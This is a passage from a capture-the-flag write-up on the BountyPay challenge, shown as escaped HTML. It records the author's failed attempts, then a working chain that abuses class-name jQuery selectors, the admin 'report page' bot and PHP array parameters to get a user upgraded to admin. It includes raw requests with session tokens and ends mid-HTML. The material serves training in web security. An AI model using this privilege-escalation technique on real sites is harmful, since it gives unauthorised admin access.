exactly what the functionality to report the page is for. My next attempt was to report this endpoint, so that Admin would visit it. Encoding \u003ccode\u003e/admin/upgrade?username=sandra.allison\u003c/code\u003egives us \u003ccode\u003eL2FkbWluL3VwZ3JhZGU/dXNlcm5hbWU9c2FuZHJhLmFsbGlzb24=\u003c/code\u003e, but reporting this page results in same response as reporting any other page:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/admin/report?url=L2FkbWluL3VwZ3JhZGU/dXNlcm5hbWU9c2FuZHJhLmFsbGlzb24=\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003estaff.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Requested-With\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eXMLHttpRequest\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e \u003cspan class=\"m\"\u003e200\u003c/span\u003e \u003cspan class=\"ne\"\u003eOK\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/json\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Report received\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis is expected, given we were told that \u003ccode\u003ePages in the /admin directory will be ignored for security\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eAt this point I went the wrong way and tried loads of different things, all leading to a dead end:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eI tried to see if Admin would access an external URL, such as Burp Collaborator. I tried a number of tricks that wold normally be used for an Open Redirect bypass, but none worked.\u003c/li\u003e\n\u003cli\u003eI though that  \u003ccode\u003ePages in the /admin directory will be ignored for security\u003c/code\u003e message could be quite literal - maybe there\u0026#39;s e.g .a regex check that a path starts with \u003ccode\u003e/admin\u003c/code\u003e that could be bypassed. I tried a number of things like path traversal, using \u003ccode\u003e\\\u003c/code\u003e instead of \u003ccode\u003e/\u003c/code\u003e etc but nothing worked.\u003c/li\u003e\n\u003cli\u003eBy this point I still didn\u0026#39;t realize SQLi hint was a troll, so I fired up sqlmap again. I\u0026#39;ve even tried injections within the reported pages - in case something worked differently for Admin than for us.\u003c/li\u003e\n\u003cli\u003eThe support ticket functionality reminded me of \u003ca href=\"/redirect?url=https%3A%2F%2Fmedium.com%2Fintigriti%2Fhow-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eTicket Trick\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, so I tried sending a few emails to addresses like \u003ccode\u003esupport@staff.bountypay.h1ctf.com\u003c/code\u003e - all bounced back.\u003c/li\u003e\n\u003cli\u003eWe don\u0026#39;t have XSS with \u003ccode\u003eprofile_name\u003c/code\u003e and \u003ccode\u003eprofile_avatar\u003c/code\u003e parameters, but maybe we have \u003ca href=\"/redirect?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fserver-side-template-injection\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eSSTI\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e? Curly braces were filtered out as well..\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eI was clearly going down the rabbit hole, especially with that SQLi trolling, so I pinged \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FxEHLE_\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e@xEHLE_\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e for a reality check, and he confirmed that I was on the right path originally with trying to make Admin visit the priv esc endpoint, and that I was just overlooking something in the javascript code. And indeed, looking more closely at the jQuery selectors I realised they were too loose and just selected the element(s) based on a class name, and not id: \u003ccode\u003e$(\u0026quot;.upgradeToAdmin\u0026quot;).click\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eThe pieces of the puzzle immediately came together. Coincidentally, we have control of the class name via \u003ccode\u003eprofile_avatar\u003c/code\u003e parameter. Coupled with the \u003ccode\u003e#tab4\u003c/code\u003e we can make Admin issue the request to the priv esc endpoint without any interaction! The steps that had to be taken are thus:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eChange our \u003ccode\u003eprofile_avatar\u003c/code\u003e to \u003ccode\u003eupgradeToAdmin tab4\u003c/code\u003e. \u003ccode\u003etab4\u003c/code\u003e class (together with \u003ccode\u003e#tab4\u003c/code\u003e in the URL) is needed so that the element would be clicked on, and \u003ccode\u003eupgradeToAdmin\u003c/code\u003e class ensures the desired jQuery callback would fire.\u003c/li\u003e\n\u003cli\u003e\n\u003ccode\u003eprofile_avatar\u003c/code\u003eis reflected within our home page, but it\u0026#39;s of no use to us since when Admin access the reported page, it would show his details and not ours. We need a page where Admin user would still have our \u003ccode\u003eprofile_avatar\u003c/code\u003e reflected, and that\u0026#39;s exactly the ticket page!\u003c/li\u003e\n\u003cli\u003eWe thus report \u003ccode\u003e/?template=ticket\u0026amp;ticket_id=3582#tab4\u003c/code\u003e, which base64-encoded is \u003ccode\u003eLz90ZW1wbGF0ZT10aWNrZXQmdGlja2V0X2lkPTM1ODIjdGFiNA==\u003c/code\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/admin/report?url=Lz90ZW1wbGF0ZT10aWNrZXQmdGlja2V0X2lkPTM1ODIjdGFiNA==\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003estaff.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHclN6dzhLTUpjUEJ6c3Z5VmIwNnRMSmFMTzZYR0FrTURqY0NsMDY0bVkrQzE3UT09\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e \u003cspan class=\"m\"\u003e200\u003c/span\u003e \u003cspan class=\"ne\"\u003eOK\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/json\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Report received\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNot so fast. We got half-way there, and we seem to be on the right track, but look again at the JS code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.upgradeToAdmin\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eclick\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003einput[name=\u0026quot;username\u0026quot;]\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eval\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"kd\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e/admin/upgrade?username=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eUser Upgraded to Admin\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThere is no input with name \u003ccode\u003eusername\u003c/code\u003e anywhere on the ticket page, so the request that Admin sends is actually\u003ccode\u003e/admin/upgrade?username=undefined\u003c/code\u003e (which can be confirmed by visiting our crafted URL directly in the browser).\u003c/p\u003e\n\n\u003cp\u003eAt this point it didn\u0026#39;t seem possible to me to influence the request any further so I went down a few more rabbit holes, including searching for SQLi again. This is finally when \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fbbuerhaus\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e@bbuerhaus\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e told me that there is no SQLi in this CTF and that it was just a troll :doh:, and that I should continue focusing on getting the admin to issue the request with desired \u003ccode\u003eusername\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eOk, so we need an input with name \u003ccode\u003eusername\u003c/code\u003e then. And it finally struck me that there is indeed one such input - back at the login page. This is when the second stage of the puzzle came together for me. Recall that we\u0026#39;re dealing with PHP - where we can turn any parameter we submit in our request into an array by simply doing \u003ccode\u003e?param[]=1\u0026amp;param[]=2\u003c/code\u003e. It\u0026#39;s finally clear why the URL routing was using this awkward syntax: \u003ccode\u003e/?template=home\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eI immediately tried turning template parameter into an array, in the hope that the backend would merge the two templates - and it did! Note the second \u003ccode\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/code\u003e in the middle. followed by the second template:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/?template[]=ticket\u0026amp;ticket_id=3582\u0026amp;template[]=login\u0026amp;username=sandra.allison\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003estaff.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHclN6dzhLTUpjUEJ6c3Z5VmIwNnRMSmFMTzZYR0FrTURqY0NsMDY0bVkrQzE3UT09\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u003c/span\u003e \u003cspan class=\"na\"\u003elang=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;en\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;head\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;meta\u003c/span\u003e \u003cspan class=\"na\"\u003echarset=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;utf-8\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;meta\u003c/span\u003e \u003cspan class=\"na\"\u003ehttp-equiv=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;X-UA-Compatible\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003econtent=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;IE=edge\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;meta\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;viewport\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003econtent=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;width=device-width, initial-scale=1\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;title\u0026gt;\u003c/span\u003eBountyPay Staff Portal\u003cspan class=\"nt\"\u003e\u0026lt;/title\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;link\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/css/bootstrap.min.css\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003erel=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;stylesheet\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;link\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/css/style.css\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003erel=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;stylesheet\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/head\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u0026lt;nav\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;navbar navbar-inverse navbar-fixed-top\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;container\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;navbar-header\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;button\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;navbar-toggle collapsed\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003edata-toggle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;collapse\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003edata-target=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;#navbar\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003earia-expanded=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;false\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003earia-controls=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;navbar\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;span\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;sr-only\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eToggle navigation\u003cspan class=\"nt\"\u003e\u0026lt;/span\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;span\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;icon-bar\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/span\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;span\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;icon-bar\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/span\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;span\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;icon-bar\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/span\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;/button\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;navbar-brand\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eBountyPay Staff\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;navbar\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;collapse navbar-collapse\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;ul\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;nav navbar-nav navbar-right\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;li\u0026gt;\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/logout\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eLogout\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;/ul\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\u003cspan class=\"c\"\u003e\u0026lt;!--/.nav-collapse --\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/nav\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;container\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;margin-top:60px\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;row\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\n        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;col-md-8 col-md-offset-2\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\n\n            \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;panel panel-default\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;panel-heading\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eMessage\u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;panel-body\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;width: 100px;position: absolute\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;margin:auto\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;avatar avatar3\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/div\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text-center\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eAdmin\u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;div\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;alert alert-info\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;margin-left:100px;min-height:80px\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                            \u003cspan class=\"nt\"\u003e\u0026lt;p\u0026gt;\u003c/span\u003eWelcome to the staff portal, This is an automated message to show you what a ticket looks like\u003cspan class=\"nt\"\u003e\u0026lt;/p\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n\n\n            \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;panel panel-default\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;panel-heading\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eReply\u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;panel-body\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan 